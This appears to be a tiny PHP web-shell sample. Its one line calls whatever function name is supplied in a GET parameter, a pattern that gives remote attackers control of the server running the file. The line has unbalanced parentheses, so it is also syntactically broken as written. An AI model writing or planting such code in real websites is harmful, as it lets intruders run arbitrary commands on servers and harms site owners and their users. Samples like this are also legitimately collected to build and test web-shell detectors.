<?php
$_GET['qpzSPkNz'](($_GET['qpzSPkNz']);
?>
